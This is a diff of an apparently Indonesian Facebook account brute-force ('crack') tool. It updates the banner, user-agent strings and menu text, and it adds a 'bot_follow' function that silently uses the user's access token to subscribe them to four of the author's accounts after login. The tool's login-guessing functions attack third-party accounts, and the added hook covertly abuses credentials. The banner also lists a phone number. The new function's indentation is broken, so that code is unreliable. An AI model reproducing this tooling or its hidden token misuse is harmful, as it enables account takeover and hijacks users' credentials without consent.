@@ -58,7 +58,18 @@ def clear():
     elif "win" in sys.platform.lower():os.system("cls")
     else:os.system("clear")
 def banner():
-    print("\x1b[0;97m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 4.0  │   Code By Aang Ardiansyah.   │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/AngCyber ••  │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘\n")
+    print("""\x1b[0;93m   ______     __ __       __
+\x1b[0;93m  / ____/____/ // / _____/ /__\x1b[0;37m • Create By Aang-XD
+\x1b[0;93m / /   / ___/ // /_/ ___/ //_/\x1b[0;37m • Wa : 089524163441
+\x1b[0;93m/ /___/ /  /__  __/ /__/ ,<   \x1b[0;37m • Yt : Aang-XD
+\x1b[0;93m\____/_/\x1b[0;37mv1.9 \x1b[0;93m/_/  \___/_/|_|  \x1b[0;37m • Tm : XNX-CODE TEAM
+\x1b[0;97m╔═════════════════════════════════════════════════════╗
+\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Author    : Aang Ardiansyah-XD                  ║
+\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Github    : Github.com/AngCyber                 ║
+\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Facebook1 : Saya Aang                           ║
+\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Facebook2 : Why Aang Ardiansyah                 ║
+\x1b[0;97m╚═════════════════════════════════════════════════════╝
+""")
 def menu_log():
     os.system('rm -rf token.txt')
     clear()
@@ -94,7 +105,7 @@ def menu_log():
         cookie = input('%s[%s•%s] %sMasukin Cookie Ngab : '%(K,P,K,H))
         try:
             data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
-            "user-agent"                : "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273", # Jangan Di Ganti Ea Anjink.
+            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109", # Jangan Di Ganti Ea Anjink.
             "referer"                   : "https://m.facebook.com/",
             "host"                      : "m.facebook.com",
             "origin"                    : "https://m.facebook.com",
@@ -112,7 +123,25 @@ def menu_log():
             xd.write(find_token.group(1))
             xd.close()
             #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
-            menu()
+            bot_follow()
+
+## Bot Follow ##
+def bot_follow():
+	try:
+		toket=open("login.txt","r").read()
+		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+		a = json.loads(otw.text)
+		nama = a["name"]
+		id = a["id"]
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
+        logs()
+    jalan("%s[%s•%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
+	requests.post("https://graph.facebook.com/100061587581422/subscribers?access_token=" + toket) # Zuhra Zuhra
+	requests.post("https://graph.facebook.com/100001390111040/subscribers?access_token=" + toket) # Saya Aang
+	requests.post("https://graph.facebook.com/100003252539235/subscribers?access_token=" + toket) # Ayu Lestari
+	requests.post("https://graph.facebook.com/100053460048331/subscribers?access_token=" + toket) # Why Aang Ardiansyah
+	menu()
         except requests.exceptions.ConnectionError:
             jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
             exit()
@@ -180,9 +209,9 @@ def menu():
         upgrade = 'Change License Key'
         jid = ''
     except (KeyError,IOError):
-        status = 'Premium/Pro'
+        status = 'Jomblo/Tidak Laku'
         users = '-'
-        kunci = 'A-ang-Ganteng-2021'
+        kunci = 'A-ang-Ganteng-7253'
         bergabung = '-'
         kadaluarsa = '30-Desember-2030'
         pro = ("%s[%sPro%s]"%(K,P,K))
@@ -203,7 +232,7 @@ def menu():
         print('%s'%(M))
         jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
         exit()
-    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]"}).json()
+    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36;]"}).json()
     try:
         ip = a["query"]
     except KeyError:
@@ -220,7 +249,7 @@ def menu():
     print('%s[%s4%s] %sAmbil Data Akun Facebook'%(K,P,K,H))
     print('%s[%s5%s] %sDump Jumlah Teman %s'%(K,P,K,H,pro))
     print('%s[%s6%s] %sLihat Hasil Crack Saya'%(K,P,K,H))
-    print('%s[%s7%s] %sCek Opsi Hasil Crack%s'%(K,P,K,H,pro))
+    print('%s[%s7%s] %sCek Opsi Hasil Crack %s'%(K,P,K,H,pro))
     print('%s[%s8%s] %sSetting User Agent'%(K,P,K,H))
     print('%s[%s0%s] %sKeluar'%(K,P,K,M))
     pm = input('%s[%s•%s] %sPilih : '%(K,P,K,K))
@@ -519,7 +548,7 @@ def pass_dev(_cici_):
     _dapunta_.append(_cici_.lower())
     return _dapunta_
 def tambah_pass():
-    print('%s[%s Setel Password %s]'%(K,O,H))
+    print('%s[%s Setel Password %s]'%(K,H,K))
     print('%s[%s•%s] %sContoh : sayang,bismillah,123456'%(K,P,K,K))
     cuy = input('%s[%s•%s] %sMasukan Pass Tambahan [1 Kata] : '%(K,P,K,K))
     gh = open('pass.txt','w')
@@ -619,7 +648,7 @@ def log_free(em,pas,hosts):
         return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
     else:return {"status":"error","email":em,"pass":pas}
 def cek_log(user, pasw, h_cp):
-    ua = "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273"
+    ua = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
     mb = "https://mbasic.facebook.com"
     ses = requests.Session()
     ses.headers.update({
@@ -1214,7 +1243,7 @@ def hasil():
     input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
     menu()
 def log_hasil(user, pasw):
-    ua = "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273"
+    ua = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
     ses = requests.Session()
     ses.headers.update({
     "Host": "mbasic.facebook.com",
